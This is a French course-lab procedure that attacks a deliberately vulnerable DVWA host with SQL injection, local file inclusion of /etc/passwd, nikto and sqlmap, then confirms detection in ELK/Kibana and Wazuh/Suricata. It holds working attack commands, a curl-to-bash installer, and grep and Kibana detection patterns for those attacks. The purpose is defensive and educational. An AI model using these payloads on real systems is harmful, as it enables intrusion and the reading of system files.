# Attaque 2 — Attaque web (SQLi, LFI)

> Mode opératoire du scénario 2. Contexte et justification : [scénarios](../2-wazuh/02-scenarios.md#scénario-2--attaque-web-injection-sql-lfi-). Prérequis : lab démarré (`lab/lab.sh up`).

- **But** : exploiter DVWA par injection SQL et inclusion de fichier local (MITRE T1190), et le détecter côté **ELK** (règle « Lab - Attaque web ») et **Wazuh** (Suricata).
- **Cible** : `http://10.10.10.10`, DVWA en sécurité *Low*.

## 1. Préparation

DVWA est déjà installé sur l'image de la victime. Pour une installation neuve :

```bash
sudo bash -c "$(curl -fsSL https://raw.githubusercontent.com/IamCarron/DVWA-Script/main/Install-DVWA.sh)"
```

DVWA exige une session : sans elle, toute URL renvoie vers `login.php`. Sur Kali, ouvrir une session (`admin`/`password`) et préparer un cookie `security=low` :

```bash
cd /tmp
TOKEN=$(curl -s -c dvwa.cookie http://10.10.10.10/login.php \
  | grep -oE "user_token' value='[a-f0-9]{32}" | grep -oE '[a-f0-9]{32}')
curl -s -b dvwa.cookie -c dvwa.cookie \
  -d "username=admin&password=password&user_token=$TOKEN&Login=Login" \
  http://10.10.10.10/login.php -o /dev/null
SID=$(grep PHPSESSID dvwa.cookie | awk '{print $NF}')
COOKIE="security=low; PHPSESSID=$SID"
```

## 2. Attaque (sur Kali)

```bash
# Injection SQL manuelle
curl -s -b "$COOKIE" \
  "http://10.10.10.10/vulnerabilities/sqli/?id=1'%20OR%20'1'='1&Submit=Submit" | grep -i surname
# Inclusion de fichier local (5 niveaux ../ : DVWA est profond)
curl -s -b "$COOKIE" \
  "http://10.10.10.10/vulnerabilities/fi/?page=../../../../../etc/passwd" | grep "^root:"
# Scanner web + injection automatisée (bruyants : user-agent reconnaissable)
nikto -h http://10.10.10.10
sqlmap -u "http://10.10.10.10/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="$COOKIE" --batch --dbs
```

## 3. Vérifications

**Victime** — requêtes journalisées par nginx :

```bash
sudo grep -E "UNION|OR '1'='1|etc/passwd|sqlmap|Nikto" /var/log/nginx/access.log | tail
```

**Hôte** — ingestion dans Elasticsearch :

```bash
cd ~/cours/secu-info/projet-ids/elk
AUTH="elastic:$(grep ^ELASTIC_PASSWORD= .env | cut -d= -f2)"
curl -s --cacert ca.crt -u "$AUTH" \
  "https://localhost:9200/logs-nginx.access-default/_count?q=source.ip:10.10.10.30%20AND%20@timestamp:%3Enow-10m"
```

**Wazuh** (`wazuh.grdr.fr` → Threat Hunting, `agent.name: victime`) : alertes Suricata ET Open sur SQLi/LFI/scanners (groupe `ids`). Les lignes nginx passent par le collecteur et ne sont pas décodées par les règles `web` natives — pour cela, ajouter sur la victime une source `localfile` directe sur `/var/log/nginx/access.log`.

**Kibana** (`localhost:5601`) :
- *Discover* : `event.dataset:"nginx.access" and source.ip:"10.10.10.30" and (url.original:(*UNION* or *%27* or *etc/passwd*) or user_agent.original:(*sqlmap* or *Nikto*))`
- *Security → Alerts* : alerte **« Lab - Tentative d'attaque web »** (règle de requête, laisser 1–2 min).

## 4. Résultat obtenu

Attaque jouée le 21/10/2026 (SQLi, LFI, `nikto`, `sqlmap`), détection confirmée des deux côtés.

Les requêtes apparaissent dans nginx avec le user-agent de l'outil, et le volume ingéré confirme l'intensité (**8 207 documents** `nginx.access` en 10 min) :

```
10.10.10.30 - - [21/Oct/2026:14:28:16] "GET /vulnerabilities/sqli/?id=1%27%20ORDER%20BY%206--%20- ..." 500 "sqlmap/1.10.6#stable"
10.10.10.30 - - [21/Oct/2026:14:28:16] "GET /vulnerabilities/sqli/?id=1%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT(...)--%20- ..." 200 "sqlmap/1.10.6#stable"
```

![Page Alerts de Kibana : règle « Lab - Tentative d'attaque web » déclenchée, host victime à 99,5 %](img/02-attaque-web/dashboard-elastic.png)

**Elastic** : la règle « Lab - Tentative d'attaque web » se déclenche (*high*, risk 73, source `10.10.10.30`) — **207 alertes**, à **99,5 %** sur `victime`.

![Discover filtré sur nginx.access et 10.10.10.30 : user-agent sqlmap mis en évidence](img/02-attaque-web/kibana-logs-filter-nginx-access.png)

Dans Discover, les requêtes `nginx.access` portent le user-agent `sqlmap/1.10.6`, parsé en ECS.

![Liste d'événements Wazuh de l'agent victime : alertes Suricata HTTP (règle 86601)](img/02-attaque-web/event-list-wazuh.png)

**Wazuh** : la détection remonte par **Suricata** (règle `86601` : `SURICATA HTTP Unexpected Request body`…), conforme à la remarque de l'étape 3.

## 5. Points d'attention

- **Session + sécurité *Low* obligatoires.** Sans le cookie de l'étape 1, les requêtes sont redirigées (302) et aucune attaque n'a lieu.
- **Capteurs complémentaires.** Suricata analyse les paquets ; la règle ELK relit l'URL décodée par nginx.
- **HTTP en clair.** Suricata voit le contenu ; en HTTPS, seules les lignes nginx resteraient exploitables (voir [bilan](../03-bilan-elk-vs-wazuh.md#limites-du-projet)).

## 6. Réponse de l'administrateur

Bloquer `10.10.10.30` · corriger l'application (requêtes préparées) ou placer un WAF · vérifier l'absence d'exfiltration (volumétrie nginx, journaux MariaDB).

## 7. Remise à zéro

```bash
cd ~/cours/secu-info/projet-ids/lab && ./lab.sh down && ./lab.sh reset && ./lab.sh up
```
